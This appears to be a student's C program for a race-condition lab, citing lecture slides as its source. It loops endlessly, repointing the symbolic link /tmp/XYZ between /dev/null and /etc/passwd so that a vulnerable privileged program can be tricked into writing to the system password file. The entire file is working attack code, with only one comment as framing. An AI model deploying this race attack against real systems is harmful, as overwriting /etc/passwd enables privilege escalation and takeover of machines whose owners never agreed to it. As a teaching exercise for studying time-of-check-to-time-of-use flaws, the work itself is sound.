// create attack_program.c (used lectur slide as resource)
#include <unistd.h>

int main(){
    while(1){
        //delete old link
        unlink("/tmp/XYZ"); 
        symlink("/dev/null", "/tmp/XYZ"); // create symbolic link from /tmp/XYZ to /dev/null 
        usleep(10000); 

        unlink("/tmp/XYZ");
        // create symbolic link from tmp/XYZ to file that we want to attack. 
        symlink("/etc/passwd", "/tmp/XYZ");
        usleep(10000); 
    }
    return 0; 
    
}